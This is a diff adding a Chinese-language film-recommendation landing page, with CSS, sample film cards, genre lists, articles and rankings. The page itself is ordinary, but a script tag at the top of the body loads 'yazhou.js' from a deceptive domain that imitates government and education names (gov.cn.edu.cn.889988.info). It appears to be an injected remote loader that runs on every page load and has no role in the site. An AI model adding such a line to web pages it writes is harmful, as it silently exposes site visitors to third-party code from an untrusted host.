@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="综合电影网是面向影迷的影视资讯与观影指南平台，汇集院线新片、经典重温、类型片单与幕后解读，提供影片介绍、评分参考、上映信息与观影建议，网址为 https://zonghedianyingwang-app.github.io">
+<meta name="keywords" content="综合电影网, 电影推荐, 院线新片, 经典电影, 影视资讯, 电影排行, 影片介绍, 观影指南, zonghedianyingwang">
+<meta name="author" content="综合电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="综合电影网 - 影视资讯与观影指南">
+<meta property="og:description" content="综合电影网提供院线新片、经典重温、类型片单与幕后解读，助你快速找到值得一看的好电影。">
+<meta property="og:url" content="https://zonghedianyingwang-app.github.io">
+<meta property="og:type" content="website">
+<title>综合电影网 | 影视资讯 · 观影指南 · 院线新片与经典重温</title>
+<style>
+:root{
+  --ink:#12141c;
+  --ink-2:#3a3f4b;
+  --muted:#7b8394;
+  --line:#e6e3dc;
+  --paper:#f7f5ef;
+  --card:#ffffff;
+  --accent:#c2410c;
+  --accent-soft:#fdeee3;
+  --gold:#b45309;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  background:var(--paper);
+  color:var(--ink);
+  line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1080px;margin:0 auto;padding:0 20px}
+
+/* 顶部导航 */
+header.navbar{
+  position:sticky;top:0;z-index:50;
+  background:rgba(247,245,239,.92);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);
+}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;height:60px;gap:16px}
+.brand{font-size:19px;font-weight:800;letter-spacing:.5px;color:var(--ink)}
+.brand em{font-style:normal;color:var(--accent)}
+.nav-links{display:flex;gap:6px;flex-wrap:wrap}
+.nav-links a{
+  font-size:14px;padding:7px 12px;border-radius:999px;color:var(--ink-2);
+  transition:.2s;
+}
+.nav-links a:hover{background:var(--accent-soft);color:var(--accent)}
+.site-url{font-size:12px;color:var(--muted);border-left:1px solid var(--line);padding-left:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:220px}
+@media(max-width:720px){
+  .site-url{display:none}
+  .nav-links a{padding:6px 9px;font-size:13px}
+}
+
+/* 首屏 */
+.hero{
+  padding:64px 0 48px;
+  background:
+    radial-gradient(circle at 88% 12%, rgba(194,65,12,.10), transparent 42%),
+    radial-gradient(circle at 6% 82%, rgba(180,83,9,.08), transparent 40%);
+}
+.eyebrow{font-size:13px;letter-spacing:3px;color:var(--accent);font-weight:700}
+.hero h1{font-size:clamp(30px,5.4vw,50px);line-height:1.18;font-weight:850;margin:14px 0 18px;letter-spacing:-.5px}
+.hero h1 span{color:var(--accent)}
+.hero p.lead{font-size:16px;color:var(--ink-2);max-width:640px}
+.hero-actions{margin-top:26px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:11px 22px;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;border:1px solid transparent;transition:.2s}
+.btn-primary{background:var(--ink);color:#fff}
+.btn-primary:hover{background:var(--accent)}
+.btn-ghost{background:transparent;color:var(--ink);border-color:#cfc9bd}
+.stats{display:flex;gap:36px;margin-top:40px;flex-wrap:wrap}
+.stat b{display:block;font-size:26px;color:var(--accent)}
+.stat small{font-size:12px;color:var(--muted);letter-spacing:1px}
+
+/* 通用区块 */
+section{padding:56px 0;border-top:1px solid var(--line)}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:28px;flex-wrap:wrap}
+.sec-head h2{font-size:clamp(22px,3.4vw,30px);font-weight:800;letter-spacing:-.3px}
+.sec-head h2 i{font-style:normal;color:var(--accent)}
+.sec-note{font-size:13px;color:var(--muted)}
+
+/* 栏目一：院线速递 */
+.cards{display:grid;grid-template-columns:repeat(12,1fr);gap:18px}
+.film{grid-column:span 4;background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s}
+.film:hover{transform:translateY(-4px);box-shadow:0 14px 30px rgba(18,20,28,.10)}
+.poster{position:relative;aspect-ratio:3/4;background:linear-gradient(160deg,#2a2f3d,#15171f);display:flex;align-items:center;justify-content:center;color:#f7f5ef;font-size:15px;font-weight:700;text-align:center;padding:20px}
+.poster::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 70% 20%,rgba(194,65,12,.35),transparent 55%)}
+.poster span{position:relative;z-index:2}
+.tag{position:absolute;top:12px;left:12px;z-index:3;background:var(--accent);color:#fff;font-size:11px;padding:3px 9px;border-radius:999px;font-weight:700}
+.film-body{padding:16px}
+.film-body h3{font-size:16px;margin-bottom:6px}
+.film-body p{font-size:13px;color:var(--ink-2);display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.meta{display:flex;justify-content:space-between;align-items:center;margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);font-size:12px;color:var(--muted)}
+.score{color:var(--gold);font-weight:800;font-size:15px}
+@media(max-width:860px){.film{grid-column:span 6}.film:last-child{grid-column:span 12}}
+@media(max-width:540px){.film{grid-column:span 12}}
+
+/* 栏目二：类型片单 */
+.genre-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.genre{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px 18px;transition:.2s}
+.genre:hover{border-color:var(--accent);background:var(--accent-soft)}
+.genre h4{font-size:16px;margin-bottom:8px}
+.genre p{font-size:12.5px;color:var(--muted)}
+.genre-num{font-size:11px;color:var(--accent);font-weight:700;letter-spacing:1px}
+@media(max-width:720px){.genre-grid{grid-template-columns:repeat(2,1fr)}}
+
+/* 栏目三：深度解读 */
+.article-list{display:grid;grid-template-columns:1.05fr .95fr;gap:22px}
+.article{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:22px;transition:.2s}
+.article:hover{box-shadow:0 10px 24px rgba(18,20,28,.08)}
+.article time{font-size:12px;color:var(--accent);font-weight:700}
+.article h3{font-size:18px;margin:8px 0 10px;line-height:1.45}
+.article p{font-size:13.5px;color:var(--ink-2)}
+.article.small{padding:18px}
+.article.small h3{font-size:15px}
+@media(max-width:760px){.article-list{grid-template-columns:1fr}}
+
+/* 栏目四：排行与关于 */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.rank{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:24px}
+.rank ol{list-style:none;counter-reset:r}
+.rank li{counter-increment:r;display:flex;align-items:center;gap:12px;padding:11px 0;border-bottom:1px solid var(--line);font-size:14px}
+.rank li:last-child{border-bottom:0}
+.rank li::before{content:counter(r);flex:none;width:26px;height:26px;border-radius:7px;background:var(--paper);border:1px solid var(--line);display:grid;place-items:center;font-size:12px;font-weight:800;color:var(--ink-2)}
+.rank li:nth-child(1)::before{background:var(--ink);color:#fff;border-color:var(--ink)}
+.rank li span{flex:1}
+.rank li b{color:var(--gold);font-size:12px;font-weight:700}
+.about{background:var(--ink);color:#f7f5ef;border-radius:12px;padding:26px}
+.about h3{font-size:20px;margin-bottom:12px}
+.about p{font-size:13.5px;color:#c9cdd6}
+.about .url-bar{margin-top:18px;padding:12px 14px;background:rgba(255,255,255,.06);border-radius:8px;font-size:12.5px;word-break:break-all;color:#fdeee3}
+@media(max-width:760px){.split{grid-template-columns:1fr}}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:34px 0 44px;margin-top:20px}
+.foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr;gap:24px;margin-bottom:26px}
+.foot-grid h5{font-size:14px;margin-bottom:10px}
+.foot-grid ul{list-style:none}
+.foot-grid li{font-size:13px;color:var(--ink-2);padding:3px 0}
+.copy{font-size:12px;color:var(--muted);border-top:1px solid var(--line);padding-top:18px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+@media(max-width:640px){.foot-grid{grid-template-columns:1fr 1fr}}
+
+/* 回到顶部 */
+.top{position:fixed;right:18px;bottom:24px;width:42px;height:42px;border-radius:50%;background:var(--ink);color:#fff;display:grid;place-items:center;font-size:16px;box-shadow:0 8px 20px rgba(0,0,0,.18);opacity:0;pointer-events:none;transition:.25s;z-index:60}
+.top.show{opacity:1;pointer-events:auto}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="navbar">
+  <div class="wrap nav-inner">
+    <a class="brand" href="#top">综合电影网<em>·</em>影荐</a>
+    <nav class="nav-links">
+      <a href="#now">院线速递</a>
+      <a href="#genre">类型片单</a>
+      <a href="#read">深度解读</a>
+      <a href="#rank">口碑排行</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <div class="site-url">https://zonghedianyingwang-app.github.io</div>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <div class="eyebrow">FILM · RECOMMEND · GUIDE</div>
+    <h1>在<span>综合电影网</span>，<br>找到下一部值得熬夜看完的电影。</h1>
+    <p class="lead">综合电影网聚焦华语与全球影像，梳理院线动态、重温影史经典、按类型组织片单，并聊聊镜头背后的创作逻辑。我们不堆砌资讯，只做筛选与解读，让每一次打开都不空手而归。</p>
+    <div class="hero-actions">
+      <a class="btn btn-primary" href="#now">看看本周新片</a>
+      <a class="btn btn-ghost" href="#genre">按心情选片</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>1280+</b><small>收录影片</small></div>
+      <div class="stat"><b>36</b><small>类型片单</small></div>
+      <div class="stat"><b>每周</b><small>更新解读</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一 -->
+<section id="now">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>院线<em style="font-style:normal;color:var(--accent)">速递</em></h2>
+      <span class="sec-note">更新于 2026 年 10 月 · 内容仅供参考</span>
+    </div>
+    <div class="cards">
+      <article class="film">
+        <div class="poster"><span>《暮色边界》</span><b class="tag">正在热映</b></div>
+        <div class="film-body">
+          <h3>暮色边界</h3>
+          <p>一位归乡摄影师在三天内重新认识故土与亲人，影片以长镜头和自然光见长，节奏舒缓却后劲十足，是今年秋冬档最被低估的一部家庭伦理片。</p>
+          <div class="meta"><span>剧情 / 家庭</span><span class="score">8.4</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <div class="poster"><span>《噪声之城》</span><b class="tag">即将上映</b></div>
+        <div class="film-body">
+          <h3>噪声之城</h3>
+          <p>以城市拆迁为背景的黑色喜剧，用荒诞笔法写小人物的生存智慧。剧本扎实、对白犀利，配乐大量采用现场环境音，观影体验极具沉浸感。</p>
+          <div class="meta"><span>喜剧 / 现实</span><span class="score">期待 8.7</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <div class="poster"><span>《深海回响》</span><b class="tag">限时展映</b></div>
+        <div class="film-body">
+          <h3>深海回响</h3>
+          <p>纪录片团队历时四年跟拍远洋科考船，呈现海洋深处的未知与脆弱。画面震撼、旁白克制，适合大银幕观看，也是对自然议题的一次冷静叩问。</p>
+          <div class="meta"><span>纪录 / 自然</span><span class="score">9.1</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二 -->
+<section id="genre">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>类型<em style="font-style:normal;color:var(--accent)">片单</em></h2>
+      <span class="sec-note">按心情与口味挑选</span>
+    </div>
+    <div class="genre-grid">
+      <a class="genre" href="#"><span class="genre-num">NO.01</span><h4>悬疑烧脑</h4><p>反转、叙事游戏与时间谜题，适合不愿被剧透的观众。</p></a>
+      <a class="genre" href="#"><span class="genre-num">NO.02</span><h4>治愈系</h4><p>慢节奏、高情绪浓度，陪你度过需要被理解的夜晚。</p></a>
+      <a class="genre" href="#"><span class="genre-num">NO.03</span><h4>硬核科幻</h4><p>从太空歌剧到近未来寓言，想象力才是真正的特效。</p></a>
+      <a class="genre" href="#"><span class="genre-num">NO.04</span><h4>犯罪写实</h4><p>聚焦罪案与人性灰度，尺度克制却直击社会肌理。</p></a>
+      <a class="genre" href="#"><span class="genre-num">NO.05</span><h4>动画佳作</h4><p>不止给孩子的画面诗，成年人也能读出另一层滋味。</p></a>
+      <a class="genre" href="#"><span class="genre-num">NO.06</span><h4>冷门宝藏</h4><p>评分不高但极具作者表达，适合愿意冒险的影迷。</p></a>
+      <a class="genre" href="#"><span class="genre-num">NO.07</span><h4>华语新声</h4><p>关注新生代导演的长片首作与作者化表达。</p></a>
+      <a class="genre" href="#"><span class="genre-num">NO.08</span><h4>经典重温</h4><p>影史坐标之作，每一次重看都会有新的发现。</p></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三 -->
+<section id="read">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>深度<em style="font-style:normal;color:var(--accent)">解读</em></h2>
+      <span class="sec-note">聊创作，也聊观感</span>
+    </div>
+    <div class="article-list">
+      <a class="article" href="#">
+        <time>2026.10.05</time>
+        <h3>为什么我们越来越爱看"慢电影"</h3>
+        <p>当短视频把注意力切碎，长镜头、留白与沉默反而成了奢侈的礼物。本文从三部近期上映的华语艺术片出发，讨论"慢"如何成为一种叙事伦理，以及它为何值得被走进影院。</p>
+      </a>
+      <div style="display:grid;gap:22px">
+        <a class="article small" href="#">
+          <time>2026.09.28</time>
+          <h3>配乐缺席时，电影靠什么说话</h3>
+          <p>环境音、静默与呼吸声，正在成为新一代导演的叙事武器。</p>
+        </a>
+        <a class="article small" href="#">
+          <time>2026.09.20</time>
+          <h3>类型片里的"反转"为何越来越难骗到人</h3>
+          <p>观众被训练得太聪明，编剧只能把赌注押在情绪而非谜题上。</p>
+        </a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四 -->
+<section id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>口碑<em style="font-style:normal;color:var(--accent)">排行</em></h2>
+      <span class="sec-note">综合评分与讨论热度</span>
+    </div>
+    <div class="split">
+      <div class="rank">
+        <h3 style="font-size:17px;margin-bottom:14px">本周观众票选 TOP 6</h3>
+        <ol>
+          <li><span>深海回响</span><b>9.1</b></li>
+          <li><span>噪声之城</span><b>8.7</b></li>
+          <li><span>暮色边界</span><b>8.4</b></li>
+          <li><span>无名之日</span><b>8.2</b></li>
+          <li><span>南风知我意</span><b>8.0</b></li>
+          <li><span>第七次日落</span><b>7.8</b></li>
+        </ol>
+      </div>
+      <div class="about" id="about">
+        <h3>关于综合电影网</h3>
+        <p>综合电影网是一个专注于影片筛选与观影引导的影视内容站点。我们相信好电影不该被算法埋没，因此以人工编选的片单、基于文本的影片介绍与创作解读，帮助观众在信息过载中做出选择。</p>
+        <p style="margin-top:10px">本站内容仅为资讯与观点分享，不构成观影强制建议；影片上映与评分信息以官方及平台实时数据为准。</p>
+        <div class="url-bar">官方网址：https://zonghedianyingwang-app.github.io</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h5>综合电影网</h5>
+        <p style="font-size:13px;color:var(--ink-2);max-width:320px">做有温度的影视筛选与解读，让好电影被更多人看见。关键词：综合电影网、电影推荐、影视资讯、观影指南。</p>
+      </div>
+      <div>
+        <h5>快速导航</h5>
+        <ul>
+          <li><a href="#now">院线速递</a></li>
+          <li><a href="#genre">类型片单</a></li>
+          <li><a href="#read">深度解读</a></li>
+          <li><a href="#rank">口碑排行</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>联系与说明</h5>
+        <ul>
+          <li>内容：原创编选</li>
+          <li>更新：每周持续</li>
+          <li>立场：独立客观</li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© 2026 综合电影网 · 影视资讯与观影指南</span>
+      <span>https://zonghedianyingwang-app.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<a class="top" id="topBtn" href="#top" aria-label="回到顶部">↑</a>
+
+<script>
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){
+  if(window.scrollY>500){topBtn.classList.add('show');}else{topBtn.classList.remove('show');}
+});
+</script>
+</body>
+</html>
